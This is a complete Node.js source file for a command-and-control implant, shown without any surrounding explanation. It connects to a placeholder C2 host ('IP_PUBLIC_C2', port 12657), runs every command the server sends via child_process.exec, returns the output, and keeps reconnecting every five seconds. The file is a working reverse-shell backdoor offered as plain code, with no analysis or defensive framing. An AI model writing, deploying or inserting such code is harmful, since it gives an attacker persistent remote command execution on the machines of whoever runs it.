import net from "net";
import { exec } from "child_process";

const C2C_HOST = "IP_PUBLIC_C2"; 
const C2C_PORT = 12657;

function connect() {
  const socket = net.createConnection(C2C_PORT, C2C_HOST, () => {
    console.log("[+] Successfully connected to C2C");
  });

  socket.on("data", (data) => {
    const cmd = data.toString().trim();
    if (!cmd) return;

    exec(cmd, (err, stdout, stderr) => {
      let output = "";

      if (err) output = err.message;
      else if (stderr) output = stderr;
      else output = stdout;

      socket.write(output || "(no output)");
    });
  });

  socket.on("close", () => {
    console.log("[-] C2C connection closed, retrying...");
    setTimeout(connect, 5000);
  });

  socket.on("error", (err) => {
    console.log("[-] Connection error: " + err.message);
    setTimeout(connect, 5000);
  });
}

connect();
